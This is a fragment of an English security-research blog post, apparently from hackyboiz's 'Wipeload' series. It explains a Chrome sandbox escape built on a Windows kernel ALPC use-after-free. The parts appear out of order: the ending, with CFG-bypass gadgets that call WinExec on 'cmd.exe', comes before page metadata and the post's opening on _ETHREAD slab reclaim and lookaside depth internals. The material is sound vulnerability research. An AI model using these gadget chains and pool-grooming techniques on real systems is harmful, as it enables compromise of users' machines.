+  &lt;span class=&#34;hljs-keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;rax&lt;/span&gt;, [&lt;span class=&#34;hljs-built_in&#34;&gt;rcx&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;]
+  &lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;rax&lt;/span&gt;
+
+chrome gadget   chrome + &lt;span class=&#34;hljs-number&#34;&gt;0x556235c&lt;/span&gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;rcx&lt;/span&gt;, [&lt;span class=&#34;hljs-built_in&#34;&gt;rcx&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;]
+  &lt;span class=&#34;hljs-keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;rax&lt;/span&gt;, [&lt;span class=&#34;hljs-built_in&#34;&gt;rcx&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;]
+  &lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; [__guard_dispatch_icall_fptr]&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;G1&lt;/code&gt;, as you can see, leaves &lt;code&gt;rcx&lt;/code&gt; untouched and calls &lt;code&gt;[rcx+0x20]&lt;/code&gt;. Since &lt;code&gt;rcx&lt;/code&gt; is &lt;code&gt;&amp;amp;g_CMalloc&lt;/code&gt;, that means calling &lt;code&gt;[g_CMalloc+0x20]&lt;/code&gt;. That&amp;#x2019;s where we plant the second gadget.&lt;/p&gt;
+&lt;p&gt;The second gadget is the real deal: &lt;code&gt;mov rcx, [rcx+0x30]&lt;/code&gt; swaps &lt;strong&gt;&lt;code&gt;rcx&lt;/code&gt;&lt;/strong&gt; out! &lt;code&gt;[g_CMalloc+0x30]&lt;/code&gt; holds the &lt;code&gt;&amp;amp;SCR_obj&lt;/code&gt; that I put there.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;SCR_obj&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;SCR_obj&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;   kernel&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;!WinExec&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And the very next line is &lt;code&gt;mov rax, [rcx+0x10]&lt;/code&gt;. Since &lt;code&gt;rcx&lt;/code&gt; just became &lt;code&gt;&amp;amp;SCR_obj&lt;/code&gt;, &lt;code&gt;rax&lt;/code&gt; receives &lt;code&gt;WinExec&lt;/code&gt;, and &lt;code&gt;rcx&lt;/code&gt; stays &lt;code&gt;&amp;amp;SCR_obj&lt;/code&gt; &amp;#x2014; that is, the address of the &lt;strong&gt;&lt;code&gt;&amp;quot;cmd.exe&amp;quot;&lt;/code&gt;&lt;/strong&gt; string &amp;#x2014; so at the very last moment it gets swapped in as the first argument of &lt;code&gt;WinExec&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs dts&#34;&gt;rcx :  &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;&lt;/span&gt;g_CMalloc  &amp;#x2192;  &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;&lt;/span&gt;g_CMalloc  &amp;#x2192;  &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;&lt;/span&gt;SCR_obj&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This bypasses CFG pretty simply too, right? hehe By borrowing a single unguarded call, we made every point CFG checks see nothing but legitimate targets. And finally, with one button click, cmd comes up just like this!!!! &amp;#x1F389;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=2AMNjFq7V-A&amp;amp;feature=youtu.be&#34;&gt;POC Video&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;5-Outro&#34;&gt;&lt;a href=&#34;#5-Outro&#34; class=&#34;headerlink&#34; title=&#34;5. Outro&#34;&gt;&lt;/a&gt;5. Outro&lt;/h1&gt;&lt;p&gt;Thank you for making it all the way to Step 6! We started from a single BSOD, made the file picker fill in the freed &lt;code&gt;_ETHREAD&lt;/code&gt; slot, used that dangling pointer to read and write a Medium process, and in the end popped cmd at Medium IL. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image16.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Tai Lung has finally broken out of prison and traveled a long road to stand before Master Shifu. Having come all the way from the Untrusted level to the Medium level, just one final gate remains.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image17.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Yes &amp;#x2014; the one that lets us become the Dragon Warrior! The Windows LPE that takes us all the way to SYSTEM! Wipeload Step 7 will come to you as banda&amp;#x2019;s Windows LPE article!&lt;/p&gt;
+&lt;p&gt;Thank you for reading all the way through!! &amp;#x1F64C;&lt;/p&gt;
+&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists&#34;&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/sync/interlocked-singly-linked-lists&#34;&gt;https://learn.microsoft.com/en-us/windows/win32/sync/interlocked-singly-linked-lists&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/&#34;&gt;https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://r0keb.github.io/posts/Windows-Kernel-Pool-Internals/&#34;&gt;https://r0keb.github.io/posts/Windows-Kernel-Pool-Internals/&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[Wipeload Step 6.] How to Escape the SandBox Painlessly (EN) - hackyboiz">
+  <meta property="og:description" content="&lt;p&gt;Hello! This is gongjae, back with Step 6 of the Wipeload project~!! We&amp;#x2019;re already at Step 6&amp;#x2026;! Shall we look back at the road we&amp;#x2019;ve walked so far?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Previous articles&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/&#34;&gt;https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/&#34;&gt;https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/&#34;&gt;https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/&#34;&gt;https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hackyboiz.github.io/2026/07/19/gongjae/Wipeload_step5/EN/&#34;&gt;https://hackyboiz.github.io/2026/07/19/gongjae/Wipeload_step5/EN/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;In Step 1, OUYA77 drew the picture of the entire chain, and in Steps 2~3, ji9umi showed us renderer RCE and the V8 heap sandbox bypass. In Step 4, OUYA77 came back to take apart how the Chrome sandbox locks itself down, and in Step 5, I covered ALPC and the &lt;code&gt;ALPC_MSGFLG_SYNC_REQUEST&lt;/code&gt; Use-After-Free. Today, in Step 6, we&amp;#x2019;re going to revive that UAF into an arbitrary &lt;strong&gt;Read/Write primitive&lt;/strong&gt;, use it as a foothold to reach &lt;strong&gt;Medium-integrity code execution&lt;/strong&gt;, and finally pull off a real &lt;strong&gt;SandBox Escape&lt;/strong&gt; &amp;#x2014; on our way to meet Master Shifu!&lt;/p&gt;
+&lt;h1 id=&#34;1-From-Crash-to-Primitive&#34;&gt;&lt;a href=&#34;#1-From-Crash-to-Primitive&#34; class=&#34;headerlink&#34; title=&#34;1. From Crash to Primitive&#34;&gt;&lt;/a&gt;1. From Crash to Primitive&lt;/h1&gt;&lt;p&gt;Alright, shall we pull up the final scene from Step 5 once more?&lt;/p&gt;
+&lt;p&gt;We planted the trigger DLL inside the renderer with sRDI, then killed &amp;#x2014; mid-flight &amp;#x2014; the thread that had a SYNC message posted via &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;, which freed the &lt;code&gt;_ETHREAD&lt;/code&gt;. And the moment we closed the port, &lt;code&gt;AlpcpCancelMessage&lt;/code&gt; fired a write at &lt;code&gt;+0x578&lt;/code&gt; of that already-dead address. And this was the result.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image2.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A BSOD means we&amp;#x2019;re done, right..? &lt;del&gt;it blew up in the kernel, so it counts as an escape&lt;/del&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Yeah.. honestly, this is where I started overthinking too.. As I hinted at the end of Step 5, Theori&amp;#x2019;s blog post also said something like &amp;#x201C;use the file picker, do a thread spray, blah blah blah, and you get code execution at Medium integrity&amp;#x201D;~..&lt;/p&gt;
+&lt;p&gt;A BSOD only proves one thing: &amp;#x201C;the kernel stepped on a dead pointer.&amp;#x201D; But that&amp;#x2019;s not what we want! We have to turn that dead pointer into &lt;strong&gt;a tool that reads and writes values we choose, at addresses we choose&lt;/strong&gt;. A crash and a primitive really are completely different things. The road from the blue screen to cmd is much longer than you&amp;#x2019;d think~..&amp;#x1F972;&lt;/p&gt;
+&lt;p&gt;But gongjae isn&amp;#x2019;t one to back down. I put my brain to work and first picked out what we&amp;#x2019;d actually need for a SandBox Escape.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;How do we turn the UAF into reading and writing the values we want, at the addresses we want? - reclaim?&lt;/li&gt;
+&lt;li&gt;Which process do we get to perform that reclaim for us? - file picker?&lt;/li&gt;
+&lt;li&gt;Once we can read and write, what do we overwrite to take over execution flow? - vtable?&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;It&amp;#x2019;s funny that they all end in question marks, but erasing those question marks one by one is exactly the goal of today&amp;#x2019;s article~!&amp;#x1F604; So let&amp;#x2019;s start with number 1!&lt;/p&gt;
+&lt;p&gt;What we freed in Step 5 was the kernel pool slab that an &lt;code&gt;_ETHREAD&lt;/code&gt; object was sitting in. The kernel takes that memory back right away and gets it ready to hand out to the next allocation. So there&amp;#x2019;s exactly one thing left for us to do: fill that spot back up with a fresh &lt;code&gt;_ETHREAD&lt;/code&gt; belonging to a process of our choosing! That is exactly what reclaim is.&lt;/p&gt;
+&lt;p&gt;What happens if this succeeds? The &lt;code&gt;WaitingThread&lt;/code&gt; pointer left behind in the message stops being a &amp;#x201C;dead address&amp;#x201D;. &lt;strong&gt;It now points at a live &lt;code&gt;_ETHREAD&lt;/code&gt;&lt;/strong&gt; inside a process we control. At that moment, the UAF transforms from a mere crash generator into a cross-process R/W window!!&lt;/p&gt;
+&lt;p&gt;Why is this hard, you ask? Because the kernel pool isn&amp;#x2019;t that naive.. You have to know, down to the bone, where a freed slab actually goes and by what rules it gets reused&amp;#x2026; &amp;#x1F643; Before we dive in: the native code running inside the renderer today is a modified version of that trigger DLL from Step 5, so for convenience I&amp;#x2019;ll just call it the &lt;strong&gt;exploit DLL&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The test environment is identical to Step 5.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;H&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;  &amp;#xB7;  ntoskrnl &lt;span class=&#34;hljs-number&#34;&gt;22621&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;963&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;Chrome&lt;/span&gt; for Testing &lt;span class=&#34;hljs-number&#34;&gt;114&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;5708&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Also, the Driver Verifier we turned on in Step 5 to make sure we&amp;#x2019;d see the BSOD is turned off this time. Special pool unmaps freed slabs entirely, so leaving it on would make today&amp;#x2019;s whole topic &amp;#x2014; reclaim &amp;#x2014; impossible!!&lt;/p&gt;
+&lt;h2 id=&#34;1-1-VS-allocator-ETHREAD-slab&#34;&gt;&lt;a href=&#34;#1-1-VS-allocator-ETHREAD-slab&#34; class=&#34;headerlink&#34; title=&#34;1.1 VS allocator _ETHREAD slab&#34;&gt;&lt;/a&gt;1.1 &lt;strong&gt;VS allocator&lt;/strong&gt; _ETHREAD slab&lt;/h2&gt;&lt;p&gt;First, let&amp;#x2019;s confirm the identity of the slab we&amp;#x2019;re up against.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs sqf&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;_ETHREAD&lt;/span&gt;)    = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x900           &lt;span class=&#34;hljs-comment&#34;&gt;// object size the kernel allocates&lt;/span&gt;
+pool block (actual) = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xa80           &lt;span class=&#34;hljs-comment&#34;&gt;// what !pool reports&lt;/span&gt;
+tag                 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Thre&amp;apos;&lt;/span&gt;          &lt;span class=&#34;hljs-comment&#34;&gt;// protected&lt;/span&gt;
+pool &lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt;           = NonPagedPoolNx&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;These two numbers are exactly where it gets confusing. &lt;code&gt;0x900&lt;/code&gt; is only ever the object size; the block that actually comes off the pool is &lt;code&gt;0xa80&lt;/code&gt;. &lt;code&gt;_POOL_HEADER&lt;/code&gt;, &lt;code&gt;_OBJECT_HEADER&lt;/code&gt;, sub-headers, and the VS chunk header all get piled on before and after, and then it gets rounded up to the VS allocator&amp;#x2019;s size class.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image3.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So the size class we&amp;#x2019;re competing over during reclaim is not &lt;code&gt;0x900&lt;/code&gt; but &lt;strong&gt;&lt;code&gt;0xa80&lt;/code&gt;&lt;/strong&gt;. When picking the slab out by eye, it&amp;#x2019;s easiest to scan the &lt;code&gt;!pool&lt;/code&gt; output for the size &lt;code&gt;a80&lt;/code&gt; + &lt;code&gt;*Thre&lt;/code&gt; combination. The &lt;code&gt;(Protected)&lt;/code&gt; printed next to it means the pool tag carries a protection bit &amp;#x2014; a kernel-side safeguard that only accepts a free when the tag matches. We aren&amp;#x2019;t calling free ourselves; we&amp;#x2019;re targeting a spot the kernel freed while tearing a thread down, so this never gets in our way.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image4.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Also, since Win10 19H1 the kernel pool is a segment heap, so which allocator handles a request depends on the size. Anything under &lt;code&gt;0x200&lt;/code&gt; goes to kLFH, &lt;code&gt;0x200&lt;/code&gt; through &lt;code&gt;0x20000&lt;/code&gt; goes to the &lt;strong&gt;VS allocator&lt;/strong&gt;, and anything larger goes to segment/large. The block-&lt;code&gt;0xa80&lt;/code&gt; &lt;code&gt;_ETHREAD&lt;/code&gt; falls into the second one &amp;#x2014; in other words, the &lt;strong&gt;VS allocator&lt;/strong&gt; manages it. Everything in today&amp;#x2019;s reclaim happens inside this allocator.&lt;/p&gt;
+&lt;p&gt;And the allocation path looks like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;NtCreateThreadEx&lt;/span&gt; &amp;#x2192; PspAllocateThread &amp;#x2192; ObpAllocateObject &amp;#x2192; ExAllocatePool&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The only entrance that hands this slab out is, in the end, &lt;code&gt;NtCreateThreadEx&lt;/code&gt; &amp;#x2014; which means &lt;strong&gt;if anybody creates one thread, one &lt;code&gt;0xa80&lt;/code&gt; block goes out&lt;/strong&gt;. The answer to why the thread spray I teased earlier actually works is packed entirely into this one line.&lt;/p&gt;
+&lt;h2 id=&#34;1-2-Dynamic-Lookaside&#34;&gt;&lt;a href=&#34;#1-2-Dynamic-Lookaside&#34; class=&#34;headerlink&#34; title=&#34;1.2 Dynamic Lookaside&#34;&gt;&lt;/a&gt;1.2 Dynamic Lookaside&lt;/h2&gt;&lt;p&gt;But here&amp;#x2019;s the thing &amp;#x2014; there&amp;#x2019;s one more layer of cache sitting in front of the VS allocator. It&amp;#x2019;s the &lt;code&gt;_RTL_DYNAMIC_LOOKASIDE&lt;/code&gt; structure that &lt;code&gt;_SEGMENT_HEAP.UserContext&lt;/code&gt; points to, and honestly, this guy is the real main character of today&amp;#x2019;s story!&lt;/p&gt;
+&lt;p&gt;Shall we check the structure directly in kd first?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; dt nt!_RTL_DYNAMIC_LOOKASIDE
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; EnabledBucketBitmap : Uint8B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x008&lt;/span&gt; BucketCount         : Uint4B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x00c&lt;/span&gt; ActiveBucketCount   : Uint4B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; Buckets             : [&lt;span class=&#34;hljs-number&#34;&gt;64&lt;/span&gt;] _RTL_LOOKASIDE
+
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; dt nt!_RTL_LOOKASIDE
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; ListHead            : _SLIST_HEADER
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x010&lt;/span&gt; Depth               : Uint2B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x012&lt;/span&gt; MaximumDepth        : Uint2B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x014&lt;/span&gt; TotalAllocates      : Uint4B
+   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; AllocateMisses      : Uint4B
+   ...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;More boring than you expected, right? There are 64 buckets, and each bucket is just a single SLIST. The behavior fits in two lines.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs livecodeserver&#34;&gt;free  &amp;#x2192; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;the&lt;/span&gt; bucket is enabled &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; depth has room &amp;#x2192; PUSH  (&lt;span class=&#34;hljs-built_in&#34;&gt;put&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;it&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;top&lt;/span&gt;)
+alloc &amp;#x2192; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;the&lt;/span&gt; size matches                        &amp;#x2192; POP   (take &lt;span class=&#34;hljs-keyword&#34;&gt;it&lt;/span&gt; off &lt;span class=&#34;hljs-keyword&#34;&gt;the&lt;/span&gt; top)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As you can probably tell, it&amp;#x2019;s &lt;strong&gt;LIFO&lt;/strong&gt;. It means the order of frees and allocs maps one-to-one. Just arrange a &amp;#x201C;free &amp;#x2192; alloc immediately after&amp;#x201D; ordering, and that alloc takes &lt;strong&gt;the very slab we just freed&lt;/strong&gt;. That&amp;#x2019;s why this reclaim isn&amp;#x2019;t a probabilistic spray where you scatter tens of thousands and wait for one to stick &amp;#x2014; it becomes &lt;strong&gt;a matter of getting the order right&lt;/strong&gt;! &amp;#x1F60E;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image5.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The freed slab lands on top of the SLIST, and the next &lt;code&gt;0xa80&lt;/code&gt; alloc POPs it right back off.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The fact that a lookaside is by design a thing that &amp;#x201C;caches fixed-size blocks and lets the system tune the depth on its own&amp;#x201D;, and that SLIST push/pop is an atomic LIFO, is spelled out in the MS docs exactly as-is.&lt;/p&gt;
+&lt;p&gt;But notice there was a condition quietly attached to those two lines: &amp;#x201C;if depth has room&amp;#x201D;. So what does this &lt;code&gt;Depth&lt;/code&gt; actually mean?&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s start with initialization. &lt;code&gt;RtlpDynamicLookasideInitialize&lt;/code&gt; walks all 64 buckets and stamps in this one line.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;mov qword ptr [rbx&lt;span class=&#34;hljs-number&#34;&gt;-2&lt;/span&gt;], &lt;span class=&#34;hljs-number&#34;&gt;1000000&lt;/span&gt;h     ; one &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;-byte store &lt;span class=&#34;hljs-built_in&#34;&gt;int&lt;/span&gt;o Buckets[n]+&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Unpack it little-endian and it lands exactly on the fields we saw earlier with &lt;code&gt;dt&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;   &amp;#x2192;  Depth        = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
++&lt;span class=&#34;hljs-number&#34;&gt;0x12&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;01&lt;/span&gt;   &amp;#x2192;  MaximumDepth = &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;256&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The maximum depth is 256, but the starting depth is 0. A freshly initialized bucket caches nothing at all. A freed slab can&amp;#x2019;t land on the SLIST and drops straight into the VS backend&amp;#x2019;s RB-tree. Reclaim can&amp;#x2019;t even get started.&lt;/p&gt;
+&lt;p&gt;So when does this &lt;code&gt;Depth&lt;/code&gt; actually grow? Tearing apart &lt;code&gt;RtlpLookasideAdjustDepth&lt;/code&gt; gives us these rules.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;nt!RtlpLookasideAdjustDepth+0x0b:
+  sub    ecx,  [r9+24h]             ; ecx  = allocs in this window
+  ...
+  sub    r10d, [r9+28h]             ; r10d = misses in this window
+  ...
+
++0x3a:
+  movzx  r8d,  word ptr [r9+10h]    ; r8d  = Depth         &amp;#x2190; current allowance
+  cmovbe eax,  r10d                 ; eax  = min(allocs, misses)
+  movzx  r10d, word ptr [r9+12h]    ; r10d = MaximumDepth  &amp;#x2190; maximum depth
+  test   ecx, ecx
+  cmovz  ecx, r11d                  ; allocs 0 &amp;#x2192; 1        &amp;#x2190; divide-by-zero guard
+  imul   eax, eax, 3E8h             ;  &amp;#xD7; 1000
+  div    ecx                        ;  &amp;#x2192; eax = miss rate (per mille)
+  cmp    ecx, 19h                   ; if the previous window had fewer than 25 allocs
+  jb     +0xae                      ;  &amp;#x2192; just shrink it
+
++0x68:
+  cmp    eax, 5                     ; if the miss rate is 0.5% or higher
+  jae    +0x7e                      ;  &amp;#x2192; go grow it
+
++0x6d:
+  sub    r8d, r11d                  ; Depth -= 1
+
++0x70:
+  mov    eax, 4
+  cmp    r8d, eax
+  cmovle r8d, eax                   ; floor 4
+  jmp    +0x2e                      ;  &amp;#x2192; store
+
++0x7e:
+  mov    ecx, r10d
+  sub    ecx, r8d                   ; headroom = MaximumDepth - Depth
+  imul   ecx, eax                   ;  &amp;#xD7; miss rate
+  ...                               ;  ( &amp;#xF7; 1000 )
+  add    edx, 5
+  mov    eax, 1Eh
+  cmovae edx, eax                   ; at most +30 per adjustment
+  lea    eax, [rdx+r8]
+  cmp    eax, r10d
+  mov    r8d, eax
+  cmovge r8d, r10d                  ; up to the maximum depth
+
++0xae:
+  sub    r8d, 0Ah                   ; Depth -= 10
+  jmp    +0x70                      ;  &amp;#x2192; to the floor clamp&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;r8d&lt;/code&gt; is &lt;code&gt;Depth&lt;/code&gt; and &lt;code&gt;r10d&lt;/code&gt; is &lt;code&gt;MaximumDepth&lt;/code&gt;. Follow just those two and the rest reads itself. There are three branches, and the two that shrink all converge on &lt;code&gt;+0x70&lt;/code&gt; at the end &amp;#x2014; the &lt;code&gt;-10&lt;/code&gt; one even jumps back for it. The &lt;code&gt;cmp r8d, eax&lt;/code&gt; / &lt;code&gt;cmovle r8d, eax&lt;/code&gt; sitting there is the easiest way to think about why the floor ends up being 4. The branch that grows clamps against the maximum depth on its own and leaves.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image6.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;fewer&lt;/span&gt; than &lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt; allocs in the last window  &amp;#x2192;  Depth -&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;miss&lt;/span&gt; rate below &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;%                     &amp;#x2192;  Depth -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;otherwise&lt;/span&gt;                                &amp;#x2192;  Depth += up to &lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;
+                                             &lt;span class=&#34;hljs-attribute&#34;&gt;floor&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, up to MaximumDepth&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;Depth&lt;/code&gt; only grows when misses happen. That means an alloc has to come in against an empty bucket.&lt;/p&gt;
